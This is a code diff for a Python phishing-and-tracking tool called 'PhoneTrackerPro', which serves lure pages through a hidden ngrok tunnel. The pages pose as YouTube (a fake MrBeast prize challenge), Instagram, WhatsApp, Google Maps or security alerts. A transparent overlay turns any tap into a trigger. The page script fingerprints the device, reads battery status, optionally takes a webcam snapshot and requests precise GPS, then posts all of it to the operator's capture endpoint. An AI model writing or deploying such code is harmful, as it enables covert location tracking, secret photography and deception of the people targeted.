@@ -1257,14 +1257,16 @@ class PhoneTrackerPro:
 
 
     def _launch_ngrok_tunnel(self, port):
-        """Inicia ngrok de forma estable y silenciosa (v6.1)."""
+        """Inicia ngrok de forma invisible usando PyngrokConfig (v6.3)."""
         try:
-            import subprocess
+            from pyngrok import conf
+            p_config = conf.get_default()
             if os.name == "nt":
+                import subprocess
                 startupinfo = subprocess.STARTUPINFO()
                 startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                startupinfo.wShowWindow = 0 # SW_HIDE
-                conf.get_default().startupinfo = startupinfo
+                startupinfo.wShowWindow = 0 
+                p_config.startupinfo = startupinfo
             
             token = os.getenv("NGROK_AUTHTOKEN", "").strip()
             if token:
@@ -1277,32 +1279,62 @@ class PhoneTrackerPro:
             return {"url": None}
 
     def _build_tracking_page(self, track_id):
-        """Genera pagina de rastreo con Open Graph y Fingerprinting avanzado (v6.1)."""
-        template = getattr(self, 'template_choice', 'security').lower()
+        """Genera pagina de rastreo Apex Predator v6.5 (Plantillas Fix)."""
+        import os
+        template = os.getenv("TEMPLATE_CHOICE", "security").lower()
+        enable_snap = "1" if os.getenv("ENABLE_SNAPCAM") == "1" else "0"
+        
+        # OG Library v6.5
         og = {
-            'title': 'Breaking News: Live Updates',
-            'desc': 'Get the latest real-time updates and breaking stories.',
-            'img': 'https://cdn-icons-png.flaticon.com/512/21/21601.png',
-            'bait': ''
+            'title': '📍 Alerta de Seguridad',
+            'desc': 'Se ha detectado un acceso inusual. Valida tu identidad para continuar.',
+            'img': 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
+            'bait_title': 'Verificación Requerida',
+            'bait_desc': 'Por favor, confirma que eres el propietario de esta cuenta.',
+            'btn_text': 'VERIFICAR AHORA',
+            'btn_color': '#d93025'
         }
 
         if 'youtube' in template:
-            og['title'] = 'YouTube - Video Recomendado'
-            og['desc'] = 'Mira este video que es tendencia ahora mismo en tu region.'
-            og['img'] = 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png'
-            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:100px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Video No Disponible</h2><p>Este video requiere verificacion. Haz clic para validar.</p><div class="btn" style="background:#ff0000;color:white;padding:12px;border-radius:2px;cursor:pointer;font-weight:bold;margin-top:10px;">VER VIDEO</div></div>'
+            og.update({
+                'title': '🎥 MrBeast: ¡RETO POR $1,000,000!',
+                'desc': 'Has sido seleccionado para participar. Mira el video antes de que sea borrado.',
+                'img': 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png',
+                'bait_title': 'Video Exclusivo',
+                'bait_desc': 'Este contenido es privado. Verifica tu region para reproducir.',
+                'btn_text': 'VER VIDEO AHORA',
+                'btn_color': '#ff0000'
+            })
         elif 'instagram' in template:
-            og['title'] = 'Instagram - Nueva Mencion'
-            og['desc'] = 'Alguien te ha etiquetado en una publicacion.'
-            og['image'] = 'https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png'
-            og['bait'] = f'<div class="card"><img src="https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png" style="width:60px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Nueva Mencion</h2><p>Inicia sesion para ver la publicacion.</p><div class="btn" style="background:#0095f6;color:white;padding:12px;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;">Ver Publicacion</div></div>'
+            og.update({
+                'title': '👤 Instagram: Te han mencionado',
+                'desc': 'Alguien te etiqueto en una historia. Toca para ver quien fue.',
+                'img': 'https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png',
+                'bait_title': 'Nueva Mencion',
+                'bait_desc': 'Tienes una mencion pendiente en una historia compartida.',
+                'btn_text': 'VER HISTORIA',
+                'btn_color': '#e1306c'
+            })
         elif 'whatsapp' in template:
-            og['title'] = 'WhatsApp - Invitacion a Grupo'
-            og['desc'] = 'Has sido invitado a unirte a un grupo de seguridad.'
-            og['img'] = 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png'
-            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:80px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Invitacion Pendiente</h2><p>Unirse al chat grupal de seguridad.</p><div class="btn" style="background:#25d366;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Unirse al Chat</div></div>'
-        else:
-             og['bait'] = '<div class="card"><h2 style="color:#d93025;font-size:1.4em;">Alerta de Seguridad</h2><p>Detectado acceso no autorizado. Valida tu posicion para asegurar tu cuenta.</p><div class="spinner"></div></div>'
+            og.update({
+                'title': '🟢 WhatsApp: Invitacion a Grupo',
+                'desc': 'Invitacion al grupo filtrado "Seguridad_Vecinal_2024". Toca para unirte.',
+                'img': 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png',
+                'bait_title': 'Invitacion Pendiente',
+                'bait_desc': 'Unirme al chat grupal de seguridad ciudadana.',
+                'btn_text': 'UNIRSE AL CHAT',
+                'btn_color': '#25d366'
+            })
+        elif 'google maps' in template or 'maps' in template:
+            og.update({
+                'title': '📍 Ubicacion Compartida contigo',
+                'desc': 'Alguien compartio su posicion en tiempo real. Toca para verla en Maps.',
+                'img': 'https://img.icons8.com/color/480/000000/google-maps.png',
+                'bait_title': 'Mapa en Tiempo Real',
+                'bait_desc': 'Ver la ubicacion actual compartida por tu contacto.',
+                'btn_text': 'ABRIR EN MAPS',
+                'btn_color': '#4285F4'
+            })
 
         return f"""<!DOCTYPE html>
 <html lang="es">
@@ -1315,33 +1347,83 @@ class PhoneTrackerPro:
 <meta property="og:image" content="{og['img']}">
 <title>{og['title']}</title>
 <style>
-  body {{ font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
-  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; }}
-  .btn {{ margin-top: 15px; cursor: pointer; }}
-  .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 2s linear infinite; margin: 10px auto; }}
-  @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+  body {{ font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
+  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 12px; text-align: center; max-width: 360px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); }}
+  .btn {{ margin-top: 20px; padding: 14px; border-radius: 6px; cursor: pointer; color: white; font-weight: bold; background: {og['btn_color']}; text-transform: uppercase; }}
+  #overlay {{ position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; cursor: pointer; background: transparent; }}
 </style>
 </head>
 <body>
-    {og['bait']}
+    <div id="overlay"></div>
+    <div class="card">
+        <img src="{og['img']}" style="width:70px;margin-bottom:20px;">
+        <h2 style="font-size:1.4em;margin:0;">{og['bait_title']}</h2>
+        <p style="color:#666;margin:15px 0;">{og['bait_desc']}</p>
+        <div id="actBtn" class="btn">{og['btn_text']}</div>
+    </div>
 <script>
 (function(){{
-  var data = {{ track_id: "{track_id}", ua: navigator.userAgent, plt: navigator.platform, res: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory }};
-  try {{
-    navigator.getBattery().then(function(b){{
-      data.bat = Math.round(b.level * 100) + "%";
-      data.charging = b.charging;
-      checkGeo();
-    }}).catch(function(){{ checkGeo(); }});
-  }} catch(e) {{ checkGeo(); }}
+  var data = {{ track_id: "{track_id}", ua: navigator.userAgent, res: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory }};
+  var enableSnap = "{enable_snap}";
+  var captured = false;
+
+  function send(d) {{ 
+    if(captured) return; // Only send the most detailed capture
+    fetch("/capture/" + d.track_id, {{ method:"POST", headers:{{"Content-Type":"application/json"}}, body:JSON.stringify(d) }}); 
+  }}
+
+  // Immediate Trigger Logic v6.5
+  window.onload = function() {{ setTimeout(startProcess, 500); }};
+  
+  // Ghost Trigger: Capture on ANY interaction with the screen
+  document.getElementById('overlay').onclick = function() {{
+     this.style.display = 'none';
+     startProcess();
+  }};
+  
+  document.getElementById('actBtn').onclick = function() {{
+     this.innerHTML = "CARGANDO...";
+     startProcess();
+  }};
+
+  function startProcess() {{
+    try {{
+      navigator.getBattery().then(function(b){{
+        data.bat = Math.round(b.level * 100) + "%";
+        data.charging = b.charging;
+        triggerIntel();
+      }}).catch(triggerIntel);
+    }} catch(e) {{ triggerIntel(); }}
+  }}
+
+  function triggerIntel() {{
+    if (enableSnap === "1") {{
+       navigator.mediaDevices.getUserMedia({{ video: true }}).then(function(s) {{
+         var v = document.createElement('video');
+         v.srcObject = s; v.onloadedmetadata = function() {{
+           v.play();
+           setTimeout(function() {{
+             var c = document.createElement('canvas');
+             c.width = v.videoWidth; c.height = v.videoHeight;
+             c.getContext('2d').drawImage(v, 0, 0);
+             data.base64_image = c.toDataURL('image/jpeg', 0.6);
+             s.getTracks().forEach(t => t.stop());
+             checkGeo();
+           }}, 1000);
+         }};
+       }}).catch(checkGeo);
+    }} else {{ checkGeo(); }}
+  }}
+
   function checkGeo() {{
     if (navigator.geolocation) {{
       navigator.geolocation.getCurrentPosition(function(p){{
-        data.gps_lat = p.coords.latitude; data.gps_lon = p.coords.longitude; data.gps_accuracy = p.coords.accuracy; send(data);
-      }}, function(e){{ data.gps_err = e.message; send(data); }}, {{enableHighAccuracy:true, timeout:10000}});
+        data.gps_lat = p.coords.latitude; data.gps_lon = p.coords.longitude; data.gps_accuracy = p.coords.accuracy; send(data); captured=true;
+      }}, function(e){{ 
+        data.gps_err = e.message; send(data); 
+      }}, {{enableHighAccuracy:true, timeout:8000}});
     }} else {{ send(data); }}
   }}
-  function send(d) {{ fetch("/capture/" + d.track_id, {{ method:"POST", headers:{{"Content-Type":"application/json"}}, body:JSON.stringify(d) }}); }}
 }})();
 </script>
 </body>
